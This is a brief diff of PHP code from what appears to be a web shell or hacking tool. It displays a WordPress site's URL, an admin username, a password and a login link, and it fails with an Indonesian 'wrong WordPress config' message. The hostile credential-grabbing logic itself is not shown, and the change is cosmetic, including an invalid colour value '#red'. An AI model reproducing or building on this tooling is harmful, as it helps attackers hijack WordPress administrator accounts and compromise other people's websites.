@@ -84,9 +84,9 @@ textarea,.mainpanel input,select,option { background-color:#000000; }
 <th width="20%">link</th></tr><tr><td width="20%">
 <font size="2" color="green">'.$site_url.'</font></td><td width="20%">'.$user.'</td>
 <td with="20%">'.$pass.'</td><td width="20%">
-<a href="'.$site_url.'/wp-login.php">
+<a href="'.$site_url.'/wp-login.php"target="_blank">
 <font color="#00ff00">login</font></td></tr></table>';} 
-else echo '<h2 class="HsH"><font color="#ff0000">ERROR !</font></h2>';} 
+else echo '<h2 class="HsH"><font color="#red">ERROR !</font></h2>';} 
 else die('<center><h2 class="HsH">Wordpress config Salah Cok</h2></center>');
 exit;
 } 
